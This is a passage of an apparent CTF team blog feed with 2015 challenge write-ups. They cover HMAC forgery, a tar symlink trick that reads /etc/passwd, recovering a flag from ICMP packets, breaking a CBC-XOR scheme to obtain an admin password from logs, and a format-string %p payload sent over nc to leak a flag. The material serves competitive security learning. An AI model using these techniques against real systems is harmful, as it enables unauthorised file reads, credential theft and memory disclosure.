</span><span class='line'>        cc=(a*(c+x))%m
</span><span class='line'>        dd=(a*(d+x))%m
</span><span class='line'>        a,b,c,d=aa,bb,cc,dd
</span><span class='line'>    return myhex(a)+myhex(b)+myhex(c)+myhex(d)
</span><span class='line'>    
</span><span class='line'>emptyhmac="ca8473d35a80a5ca4e9f3555c2869f71" #hmac("")
</span><span class='line'>
</span><span class='line'>import re
</span><span class='line'>emptystate=map(lambda x:int(convert2be(x),16),re.findall('.'*8,emptyhmac))
</span><span class='line'>
</span><span class='line'>print hash("flag",emptystate)
</span></code></pre></td></tr></table></div></figure>


<p>by executing the script we have the following HMAC:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python weshgrow-sol.py                                                                                                                                                                      
</span><span class='line'>3f6933240ae234edddc27544d949238c  </span></code></pre></td></tr></table></div></figure>


<p>by opening the following url we have the flag:</p>

<blockquote><p>/flag?hmac=3f6933240ae234edddc27544d949238c</p>

<p>FLAG ? FLAG !
Can_I_haz_s3cureD_hm4c_plz?</p></blockquote>

<p>PS: There is a solution as PDF file for <code>Persian</code> Users too which can be obtained from <a href="http://geeksspeak.github.io/files/ctf/ndh2k15/weshgrow/weshgrow-sol-fa.pdf">here</a>.</p>

<p>by <code>f02</code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[NDH CTF 2015 - Facesec Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/06/ndh-ctf-2015-facesec-writeup/"/>
    <updated>2015-04-06T01:56:25+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/06/ndh-ctf-2015-facesec-writeup</id>
    <content type="html"><![CDATA[<p><strong>NDH 2015 Facesec Writeup</strong><br/>
<strong>Point = 100</strong><br/>
<strong>Category = Web</strong><br/>
<strong>Description : </strong></p>

<blockquote><p>&ldquo;Hello there,</p>

<p>We are looking for a developer or security consultant to secure our filebox system. We stumbled upon your LinkedIn profile and it seems like you would be a perfect candidate for this job. Could you please send us your CV and Motivation letter?<br/>
Thanks,</p>

<p><a href="http://facesec.challs.nuitduhack.com/">http://facesec.challs.nuitduhack.com/</a></p></blockquote>

<p>after you open the link , you can see a login/register system.so sign up and login to my account</p>

<p>after that you seen a upload form with this description :</p>

<blockquote><p>You can upload a .txt file if you specify the type of the content (cv or motivation letter).
If you want, you can upload a tar archive which contains two files (cv.txt and motiv.txt).
The content will be update in your profil we can examine your instance.</p></blockquote>

<p>so try to upload your file , contents of 2 texts go to 2 field in your profile name as CV and Motivation Letter</p>

<!--more-->


<p>if you try to upload file with extension you got an error</p>

<p>you can .tar file.<br/>
according to this link you can execute command with tar file :</p>

<p><a href="http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">Tar file command execution</a><br/>
so we try to Symlink /etc/passwd to CV.txt</p>

<p>when upload complete and we go to the profile link we can see this :</p>

<pre><code>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin facesec:x:1000:1000:W00tSymL1nkAttackStillW0rksIn2k15:/home/facesec:/bin/sh 
</code></pre>

<p>Bingo :D</p>

<p>Flag is : W00tSymL1nkAttackStillW0rksIn2k15</p>

<p>WriteUp By Fr0nk</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[NDH CTF 2015 - Cooper Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/06/ndh-ctf-2015-cooper-writeup/"/>
    <updated>2015-04-06T01:52:15+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/06/ndh-ctf-2015-cooper-writeup</id>
    <content type="html"><![CDATA[<p><strong>NDH 2015 Cooper Writeup</strong><br/>
<strong>Point = 300</strong><br/>
<strong>Category = Stegano</strong></p>

<blockquote><p>&ldquo;I am not crazy, my mother had me tested.&rdquo; (Sheldon)</p>

<p>What did Sheldon &hellip; huh sorry, Dr. Cooper really mean?
(<a href="http://quals.nuitduhack.com/challenges/view/14">http://quals.nuitduhack.com/challenges/view/14</a>)</p></blockquote>

<p>The tar zip contains a Windows executable, so the first thing I did was opening it in CFF Explorer.
Doing so I found a picture of Sheldon &hellip; or better say <code>"Dr. Cooper"</code> in resources and a section called .hidden containing a ZIP file.</p>

<p><img src="http://geeksspeak.github.io/files/ctf/ndh2k15/cooper/cooper.bmp" title="khkhkhhhhhh" alt="Sheldon's picture" /></p>

<!--more-->


<p>Within the zip file there was a C++ code project with encrypt and decrypt functions.</p>

<pre><code>&gt; dir Stegano-BMP-master
...
2013-06-21  05:24 PM               533 decrypt.cpp
2015-04-04  12:10 PM    &lt;DIR&gt;          easybmp
2013-06-21  05:24 PM               768 encrypt.cpp
2013-06-21  05:24 PM                28 main.cpp
2013-06-21  05:24 PM               564 Makefile
2013-06-21  05:24 PM               238 README.md
2013-06-21  05:24 PM             2,705 stegano.cpp
2013-06-21  05:24 PM               196 stegano.h
               7 File(s)          5,032 bytes
</code></pre>

<p> First thing that strikes the mind is to compile the project and decrypt (extract) the flag from it, and I did, and I FAILED :(</p>

<pre><code class="`"> &gt;decrypt cooper.bmp
 3
</code></pre>

<p> Obviously <code>3</code> cannot be the flag! (but I did submit it and the server did reject it :))
 So I insepected the files more, and I found a <a href="http://geeksspeak.github.io/pdfFile.pdf">PDF</a> file in the EXE&rsquo;s hex dump.
 I fixed and opened it and finally found &ldquo;my precious&rdquo;!</p>

<p> <img src="http://geeksspeak.github.io/files/ctf/ndh2k15/cooper/flag.jpg" title="StephenHawkingSpentSomeTimeOnSteganoTrolling" alt="tha flag" /></p>

<p>BTW: The <a href="http://geeksspeak.github.io/files/ctf/ndh2k15/cooper/pdfFile.pdf">PDF</a> is password protected which the reader has to guess :D</p>

<p> Written by <strong><a href="http://twitter.com/shabgrd">MMS</a></strong></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[NDH CTF 2015 - Private Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/05/ndh-ctf-2015-private-writeup/"/>
    <updated>2015-04-05T15:43:15+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/05/ndh-ctf-2015-private-writeup</id>
    <content type="html"><![CDATA[<p><strong>NDH 2015 Private Writeup</strong><br/>
<strong>Point = 100</strong><br/>
<strong>Category = Forensics</strong><br/>
<strong>Description : </strong></p>

<blockquote><p>&ldquo;The quiet you are, the more you are able to ear&rdquo;</p></blockquote>

<p>We&rsquo;ve provided a pcapng file in this challenge. At first glance I thought it may be VoIP challenge because of description but after viewing packets , this assumption goes wrong. there were some STP , CDP and some ICMP packets . after some investigation in packets i found some unusual ICMP packets ! their identification fields were 0 ! all of them ! hmmm. seems somebody generated them manually by a packet generator . so i focused on them to find a pattern .actually their IP headers had a pattern and they were ASCII numbers ! sweet . that&rsquo;s easy . let&rsquo;s have some fun with Scapy .</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>from scapy.all import *
</span><span class='line'>from scapy.utils import rdpcap
</span><span class='line'>flag=""
</span><span class='line'>pkts=rdpcap("private.pcap")
</span><span class='line'>for pkt in pkts:
</span><span class='line'>   if (ICMP in pkt and pkt[ICMP].type==8 and pkt[ICMP].id==0 ):
</span><span class='line'>      flag += chr(pkt[IP].id)
</span><span class='line'>print flag        
</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[NDH CTF 2015 - Updator Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/05/ndh-ctf-2015-updator-writeup/"/>
    <updated>2015-04-05T03:28:56+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/05/ndh-ctf-2015-updator-writeup</id>
    <content type="html"><![CDATA[<p><strong>NDH 2015 Updator Writeup</strong><br/>
<strong>Point = 200</strong><br/>
<strong>Category = Exploit</strong></p>

<blockquote><p>Unhackable : &ldquo;Not hackable; that cannot be hacked or broken into.&rdquo;
We manage updates and thus have fixes, this is not a PS3 as it is unhackable &hellip; or is it?
Score     200
Link      <a href="http://updator.challs.nuitduhack.com/">http://updator.challs.nuitduhack.com/</a></p></blockquote>

<p>openning the url gives us a login page and a update button. pressing update button shows an notification:</p>

<blockquote><p>The update managing system is still under construction but will be available soon.</p></blockquote>

<p>We noticed it&rsquo;s a python script <code>update.py</code>. So attempting to loading <code>update.pyc</code> gave us the permission to download the file. Instantly i tried to decompile the code with <code>uncompyle2</code> as:</p>

<!--more-->


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ /usr/local/bin/uncompyle2 update.pyc &gt; update.py
</span><span class='line'>$ cat update.py
</span><span class='line'># 2015.04.05 03:00:11 IRDT
</span><span class='line'># Embedded file name: update.py
</span><span class='line'>import config
</span><span class='line'>import sys
</span><span class='line'>KEY = config.KEY
</span><span class='line'>
</span><span class='line'>def xor(*args):
</span><span class='line'>    if len(args) &lt; 2:
</span><span class='line'>        sys.exit(0)
</span><span class='line'>    length = len(args[0])
</span><span class='line'>    for arg in args:
</span><span class='line'>        if len(arg) != length:
</span><span class='line'>            sys.exit(0)
</span><span class='line'>        length = len(arg)
</span><span class='line'>
</span><span class='line'>    cipher = args[0]
</span><span class='line'>    for arg in args[1:]:
</span><span class='line'>        cipher = ''.join([ chr(ord(arg[i]) ^ ord(cipher[i])) for i in range(len(arg)) ])
</span><span class='line'>
</span><span class='line'>    return cipher
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>class Crypto:
</span><span class='line'>
</span><span class='line'>    @staticmethod
</span><span class='line'>    def encrypt(file):
</span><span class='line'>        with open(file, 'r') as fd:
</span><span class='line'>            content = fd.read()
</span><span class='line'>        content = content.ljust(len(content) + (8 - len(content) % 8), '0')
</span><span class='line'>        blocks = [ content[i * 8:(i + 1) * 8] for i in range(len(content) / 8) ]
</span><span class='line'>        with open('%s.encrypted' % file, 'w') as fd:
</span><span class='line'>            encrypted = []
</span><span class='line'>            for i in range(len(blocks)):
</span><span class='line'>                if i == 0:
</span><span class='line'>                    encrypted.append(xor(KEY, blocks[i]))
</span><span class='line'>                else:
</span><span class='line'>                    encrypted.append(xor(KEY, blocks[i], encrypted[i - 1]))
</span><span class='line'>
</span><span class='line'>            fd.write(''.join(encrypted))
</span><span class='line'>
</span><span class='line'>    @staticmethod
</span><span class='line'>    def decrypt(file):
</span><span class='line'>        with open(file, 'r') as fd:
</span><span class='line'>            content = fd.read()
</span><span class='line'>        blocks = [ content[i * 8:(i + 1) * 8] for i in range(len(content) / 8) ]
</span><span class='line'>        with open('.'.join(file.split('.')[:-1]), 'w') as fd:
</span><span class='line'>            plain = []
</span><span class='line'>            for i in range(len(blocks)):
</span><span class='line'>                if i == 0:
</span><span class='line'>                    plain.append(xor(KEY, blocks[i]))
</span><span class='line'>                else:
</span><span class='line'>                    plain.append(xor(KEY, blocks[i], blocks[i - 1]))
</span><span class='line'>
</span><span class='line'>            fd.write(''.join(plain).rstrip('0'))
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>print 'Content-Type: text/html'
</span><span class='line'>print '\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;meta charset="UTF-8"&gt;\n    &lt;title&gt;Updator - Update system&lt;/title&gt;\n    &lt;link rel="stylesheet" href="static/font-awesome/css/font-awesome.css"&gt;\n    &lt;link rel="stylesheet" href="static/css/style.css"&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;div id="info"&gt;\n      The update managing system is still under construction but will be available soon.\n    &lt;/div&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n'
</span><span class='line'># okay decompyling update.pyc 
</span><span class='line'># decompiled 1 files: 1 okay, 0 failed, 0 verify failed
</span><span class='line'># 2015.04.05 03:00:11 IRDT</span></code></pre></td></tr></table></div></figure>


<p>This a simple CBC mode XOR encryption. In the meantime my friend figured out that <code>robots.txt</code> tells us we should take look at <code>/temp/</code> directory. there was a file named <code>log.py.encrypted</code>:</p>

<blockquote><p>Index of /temp
[ICO]  Name    Last modified   Size    Description<br/>
[DIR]  Parent Directory        - <br/>
[TXT]  log.py.encrypted    31-Mar-2015 17:35   328      <br/>
Apache/2.2.22 (Debian) Server at 10.0.0.5 Port 80</p></blockquote>

<p>As we saw in the decompiled source the encrypt function encrypts a file and saves as <code>name+.encrypted</code>. So we tried to decrypt the file as my friend did. with this assumption that the first block has <code>import</code> keyword he xor the first block with that and take a some chars for the <code>KEY</code>. remember the CBC mode:
<img src="http://upload.wikimedia.org/wikipedia/commons/8/80/CBC_encryption.svg"/><br/>
We have second block if we calculate <code>encrypted[0] ^ encrypted[1]</code>. So he xored the calculated block and the key he take from the previous part. and there was <code>atetime</code>. So after completing the key we can decrypt the file. ( ofcourse it is not a proper solution as you can use xortool and &hellip; but faster than everything :) thanks to him ;) ). So i managed to decrypt the file using edited above source:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>import sys
</span><span class='line'>KEY = '6[@dq"&s'
</span><span class='line'>
</span><span class='line'>def xor(*args):
</span><span class='line'>    if len(args) &lt; 2:
</span><span class='line'>        sys.exit(0)
</span><span class='line'>    length = len(args[0])
</span><span class='line'>    for arg in args:
</span><span class='line'>        if len(arg) != length:
</span><span class='line'>            sys.exit(0)
</span><span class='line'>        length = len(arg)
</span><span class='line'>
</span><span class='line'>    cipher = args[0]
</span><span class='line'>    for arg in args[1:]:
</span><span class='line'>        cipher = ''.join([ chr(ord(arg[i]) ^ ord(cipher[i])) for i in range(len(arg)) ])
</span><span class='line'>
</span><span class='line'>    return cipher
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>def decrypt(file):
</span><span class='line'>    with open(file, 'rb') as fd:
</span><span class='line'>        content = fd.read()
</span><span class='line'>    blocks = [ content[i * 8:(i + 1) * 8] for i in range(len(content) / 8) ]
</span><span class='line'>    with open('.'.join(file.split('.')[:-1]), 'w') as fd:
</span><span class='line'>        plain = []
</span><span class='line'>        for i in range(len(blocks)):
</span><span class='line'>            if i == 0:
</span><span class='line'>                plain.append(xor(KEY, blocks[i]))
</span><span class='line'>            else:
</span><span class='line'>                plain.append(xor(KEY, blocks[i], blocks[i - 1]))
</span><span class='line'>
</span><span class='line'>        fd.write(''.join(plain).rstrip('0'))
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>decrypt('log.py.encrypted')
</span></code></pre></td></tr></table></div></figure>


<p>make sure you use <code>rb</code> to decrypt properly. We have decrypted file as:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>import datetime
</span><span class='line'>
</span><span class='line'>LOG_DIR = 'logs'
</span><span class='line'>
</span><span class='line'>class Logger():
</span><span class='line'>
</span><span class='line'>    @staticmethod
</span><span class='line'>    def log(username, password):
</span><span class='line'>        basename = '%s/%s_%s' % (LOG_DIR, str(datetime.date.today()), username)
</span><span class='line'>        with open(basename, 'a+') as fd:
</span><span class='line'>            fd.write('[%s] Login with password %s\n' % (str(datetime.datetime.today()), password))
</span></code></pre></td></tr></table></div></figure>


<p>there is another directory we should take a look <code>logs</code> no permission:</p>

<blockquote><p>Forbidden<br/>
You don&rsquo;t have permission to access /logs/ on this server.<br/>
Apache/2.2.22 (Debian) Server at 10.0.0.5 Port 80</p></blockquote>

<p>but reading carefully the code gave me the idea to find the exact location:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">datetime</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">date</span><span class="o">.</span><span class="n">today</span><span class="p">())</span>
</span><span class='line'><span class="s">&#39;2015-04-04&#39;</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="s">&quot;</span><span class="si">%s</span><span class="s">/</span><span class="si">%s</span><span class="s">_</span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span><span class="p">(</span><span class="s">&quot;logs&quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">date</span><span class="o">.</span><span class="n">today</span><span class="p">()),</span> <span class="s">&quot;admin&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">logs</span><span class="o">/</span><span class="mi">2015</span><span class="o">-</span><span class="mo">04</span><span class="o">-</span><span class="mo">04</span><span class="n">_admin</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>opening <code>http://updator.challs.nuitduhack.com/logs/2015-04-04_admin</code> gave me this log:</p>

<blockquote><p>[2015-04-04 18:49:48.839448] Login with password Mpt2P4sse2Ouf
[2015-04-04 18:49:54.044382] Login with password Mot2P4sse2Ouf</p></blockquote>

<p>Second password worked for me and after logging in we have the flag:</p>

<blockquote><p>Well played, here is your flag : zEpbiUFt5p7m84cxOxN6</p></blockquote>

<p>Interesting challenge So we&rsquo;ve got 200pts.</p>

<p>HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF 2015 - TEAM Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-team-writeup/"/>
    <updated>2015-04-03T03:16:39+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-team-writeup</id>
    <content type="html"><![CDATA[<p><strong>Backdoor 2015 TEAM Writeup</strong><br/>
<strong>Point = 600</strong><br/>
<strong>Category = Exploit</strong></p>

<blockquote><p>There is a wierd kind of authentication service running: nc hack.bckdr.in 8004. The binary can be found here. The vampire says that there is no need for bruteforce.</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ file team
</span><span class='line'>team: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=3fb6836dc9249bd1e7c33e023d563ff429d7dca4, stripped
</span><span class='line'>$ checksec.sh --file team
</span><span class='line'>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
</span><span class='line'>Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   team
</span></code></pre></td></tr></table></div></figure>


<p>Ok looking into the binary in IDA shows us two function <code>0x08048769</code> and <code>0x080486ad</code> are important to us. the first one can be seen bellow:</p>

<!--more-->


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>int sub_8048769()
</span><span class='line'>{
</span><span class='line'>  const char *v0; // ST18_4@1
</span><span class='line'>  const char *v1; // ST1C_4@1
</span><span class='line'>
</span><span class='line'>  v0 = (const char *)malloc(0xC8u);
</span><span class='line'>  v1 = (const char *)malloc(0x64u);
</span><span class='line'>  printf("Enter teamname: ");
</span><span class='line'>  fflush(stdout);
</span><span class='line'>  __isoc99_scanf("%200s", v0);
</span><span class='line'>  printf("Enter flag: ");
</span><span class='line'>  fflush(stdout);
</span><span class='line'>  __isoc99_scanf("%100s", v1);
</span><span class='line'>  sleep(2u);
</span><span class='line'>  sub_80486AD(v0, v1);
</span><span class='line'>  free((void *)v0);
</span><span class='line'>  free((void *)v1);
</span><span class='line'>  return 0;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>As you can see there is no potential flaw so we skip to second one:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>signed int __cdecl sub_80486AD(const char *a1, const char *a2)
</span><span class='line'>{
</span><span class='line'>  signed int result; // eax@2
</span><span class='line'>  int v3; // edx@7
</span><span class='line'>  FILE *stream; // [sp+24h] [bp-74h]@1
</span><span class='line'>  char s; // [sp+28h] [bp-70h]@3
</span><span class='line'>  int v6; // [sp+8Ch] [bp-Ch]@1
</span><span class='line'>
</span><span class='line'>  v6 = *MK_FP(__GS__, 20);
</span><span class='line'>  stream = fopen("flag.txt", "r");
</span><span class='line'>  if ( stream )
</span><span class='line'>  {
</span><span class='line'>    fgets(&s, 100, stream);
</span><span class='line'>    printf(a1);
</span><span class='line'>    if ( !strcmp(&s, a2) )
</span><span class='line'>      puts(" : correct flag!");
</span><span class='line'>    else
</span><span class='line'>      puts(" : incorrect flag. Try again.");
</span><span class='line'>    fclose(stream);
</span><span class='line'>    result = 0;
</span><span class='line'>  }
</span><span class='line'>  else
</span><span class='line'>  {
</span><span class='line'>    result = 1;
</span><span class='line'>  }
</span><span class='line'>  v3 = *MK_FP(__GS__, 20) ^ v6;
</span><span class='line'>  return result;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>interesting! in this function flag.txt will be opened and read but the important part is <code>printf(a1);</code>. remember previous function <code>a1</code> is the <code>v0</code> var which have the teamname! So there is a <em>Format String Vulnerability</em>. And the abuse is pretty simple, just printing the stack addresses to leak the flag:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat 5
</span><span class='line'>%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
</span><span class='line'>A
</span><span class='line'>
</span><span class='line'>$ cat 5 | nc hack.bckdr.in 8004
</span><span class='line'>Enter teamname: Enter flag: 0x640x9dd11400xf770ec20(nil)0x10x9dd10d80x9dd10080xf773855c0x9dd11400x356633640x643630310x376531390x323461370x383565620x636135300x613835640x643862310x313164610x383766610x356363660x313833660x666432630x363336350x353335390x626631370x80483000x1(nil)0x1(nil)(nil)0xff8b30880xf772b5000x10x5fc69000(nil)(nil)0xff8b3088 : incorrect flag. Try again.</span></code></pre></td></tr></table></div></figure>


<p>you can see that</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0x356633640x643630310x376531390x323461370x383565620x636135300x613835640x643862310x313164610x383766610x356363660x313833660x666432630x363336350x353335390x62663137</span></code></pre></td></tr></table></div></figure>


<p>is our flag. using python <code>struct</code> module for all gives us this one:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[redacted]</span></code></pre></td></tr></table></div></figure>


<p>which added 600pts to our points.</p>

<p>HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF 2015 - FORGOT Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-forgot-writeup/"/>
    <updated>2015-04-03T02:57:55+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-forgot-writeup</id>
    <content type="html"><![CDATA[<p><strong>Backdoor 2015 FORGOT Writeup</strong><br/>
<strong>Point = 200</strong><br/>
<strong>Category = Exploit</strong></p>

<blockquote><p>Fawkes has been playing around with Finite State Automaton lately. While exploring the concept of implementing regular expressions using FSA he thought of implementing an email-address validator.<br/>
